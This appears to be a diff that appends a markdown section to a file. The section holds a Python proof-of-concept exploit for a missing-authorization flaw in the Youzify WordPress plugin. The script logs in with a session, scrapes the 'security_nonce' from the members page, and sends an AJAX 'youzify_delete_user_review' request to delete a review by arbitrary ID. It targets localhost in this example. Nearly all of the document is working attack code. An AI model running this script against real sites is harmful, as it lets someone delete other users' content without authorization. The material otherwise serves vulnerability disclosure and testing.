@@ -172,3 +172,128 @@ function delete_user_review() {
 
     exit;
 }
+
+
+# Missing Authentication Exploit Example
+
+The following Python script demonstrates a missing authentication exploit in a WordPress site using AJAX. This script logs into the site, retrieves a nonce token from a specific page, and then uses this nonce to delete a review via an AJAX request.
+
+### Code
+
+```python
+import requests
+from bs4 import BeautifulSoup
+import re
+
+# Set your login credentials and site details
+site_url = "https://localhost/pentest"
+login_url = f"{site_url}/wp-login.php"
+ajax_url = f"{site_url}/wp-admin/admin-ajax.php"
+
+username = "username"
+password = "password"
+review_id = 2  # Arbitrary review ID for testing
+
+# Start a session to maintain cookies between requests
+session = requests.Session()
+
+# Function to get the security_nonce from the page after login
+def get_security_nonce(url):
+    # Fetch the page content
+    response = session.get(url, verify=False)
+    
+    # Check if the request was successful
+    if response.status_code != 200:
+        print(f"Failed to retrieve the page, status code: {response.status_code}")
+        return None
+    
+    # Parse the page using BeautifulSoup
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Find the <script> tag with the security_nonce value
+    script_tag = soup.find('script', {'id': 'youzify-js-extra'})
+    if script_tag:
+        # Use regex to extract the security_nonce value from the JavaScript code
+        match = re.search(r'"security_nonce":"([^"]+)"', script_tag.string)
+        if match:
+            # Return the extracted security_nonce value
+            return match.group(1)
+        else:
+            print("security_nonce not found in the script tag.")
+    else:
+        print("Script tag with id 'youzify-js-extra' not found.")
+    
+    return None
+
+# Step 1: Visit the login page to set the test cookie
+try:
+    session.get(login_url, verify=False)  # This request sets initial cookies
+except requests.exceptions.RequestException as e:
+    print(f"Error fetching login page: {e}")
+    exit()
+
+# Step 2: Log in to WordPress
+login_data = {
+    'log': username,
+    'pwd': password,
+    'wp-submit': 'Log In',
+    'redirect_to': site_url,
+    'testcookie': '1'  # WordPress uses this to verify cookies are enabled
+}
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+# Attempt to login
+try:
+    login_response = session.post(login_url, data=login_data, headers=headers, verify=False)
+    login_response.raise_for_status()
+    
+    # Check if login was successful by examining response content
+    if "login_error" in login_response.text:
+        print("Login failed with error message:")
+        print(login_response.text)
+    elif "dashboard" not in login_response.text:
+        print("Login failed. The dashboard was not found in the response.")
+    else:
+        print("Logged in successfully.")
+        
+        # Step 3: Fetch the security_nonce from the page after successful login
+        nonce = get_security_nonce(f"{site_url}/members")
+        if not nonce:
+            print("Failed to retrieve the security_nonce.")
+            exit()
+
+        # Step 4: Send the AJAX request to delete the review
+        ajax_data = {
+            'action': 'youzify_delete_user_review',
+            'security': nonce,  # Use the nonce value fetched after login
+            'review_id': review_id  # Arbitrary ID to trigger the "does not exist" message
+        }
+
+        # Make the POST request to the AJAX handler
+        ajax_response = session.post(ajax_url, data=ajax_data, headers=headers, verify=False)
+            
+        # Debugging output for better understanding of the request and response
+        print("AJAX request sent to:", ajax_url)
+        print("AJAX request data:", ajax_data)
+        print("AJAX response status:", ajax_response.status_code)
+        print("AJAX response headers:", ajax_response.headers)
+            
+        # Check if the AJAX request was successful
+        if ajax_response.ok:
+            try:
+                print("AJAX response received:")
+                print(ajax_response.json())
+            except ValueError:
+                print("Received a non-JSON response from AJAX request:")
+                print(ajax_response.text)
+        else:
+            print(f"Failed to reach the AJAX endpoint. HTTP Status: {ajax_response.status_code}")
+            print(f"Response text: {ajax_response.text}") 
+            
+except requests.exceptions.HTTPError as err:
+    print(f"HTTP error occurred: {err}")
+except requests.exceptions.RequestException as e:
+    print(f"Error: {e}")
